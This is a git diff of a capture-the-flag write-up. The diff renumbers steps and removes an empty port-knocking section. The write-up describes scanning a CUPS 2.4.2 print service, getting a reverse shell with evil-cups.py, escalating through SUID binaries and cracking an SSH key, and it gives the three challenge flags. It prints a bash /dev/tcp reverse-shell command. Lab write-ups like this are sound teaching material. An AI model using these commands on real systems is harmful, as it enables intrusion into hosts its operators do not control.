@@ -102,10 +102,8 @@ ip.addr==192.168.248.151 && ip.addr==192.168.248.137 && (tcp.flags.syn == 1 && t
 ![screenshot](./static/screenshot.png)
 
 
-### Step 9: Port Knocking on PCAP (TCP.SYN.ACK to open port 631)
-- in detail on which port is being knocked
 
-### Step 10: Nmap to port 631 and found new service called CUPS
+### Step 6: Nmap to port 631 and found new service called CUPS
 After analyzing the pcap file, we notice the use of port 631, which is for the Internet Printing Protocol (IPP). This protocol is commonly used by CUPS (Common UNIX Printing System) to manage print jobs and printers over a network. 
 
 References: [631 - Internet Printing Protocol (IPP)](https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp)
@@ -136,7 +134,7 @@ Nmap done: 1 IP address (1 host up) scanned in 11.44 seconds
 
 From the scan result, we get to know that CUPS service is running with the version 2.4.2 which uses IPP and able to access with a web interface, as it indicated the HTTP details with `robots.txt`. 
 
-### Step 11: Get reverse shell via evilcups to the victim machine
+### Step 7: Get reverse shell via evilcups to the victim machine
 
 To gain access to the victim machine, utilize reverse shell from [evilcups.py](https://github.com/IppSec/evil-cups/blob/evilcups.py) which allow the attacker's machine to receive connection from the victim machine
 
@@ -158,7 +156,7 @@ python3 evil-cups.py 172.20.10.4 172.20.10.6 'bash -c "bash -i >& /dev/tcp/172.2
 Once we enter the victim machine, the first flag is located at `/home/lp`, we can cat the `initial_flag.txt`
 **1st Flag:** `MCC24{h3ll0_fr0m_pr1nt1ng_s3rv1c3s}`
 
-### Step 12: Use tools suid3num to enumerate 
+### Step 8: Use tools suid3num to enumerate 
 
 ![image](./static/image.png)
 
@@ -170,7 +168,7 @@ Now, we have found the second flag.
 
 **2nd Flag:** `MCC24{4bus1ng_su1d}`
 
-### Step 13: Found last flag with alexander's privilege at home directory 
+### Step 9: Found last flag with alexander's privilege at home directory 
 
 We got the ssh public key and private key from the machine. We can utilize `ssh2john` to prepare for hash cracking.
 
@@ -183,5 +181,8 @@ Next, we can use ssh to connect after successfully cracked the hash and then we 
 ![image (1)](./static/image-1.webp)
 
 **3rd Flag:** `MCC24{g00d_j0b_3v3ry0n3}`
+
+
+
 
 
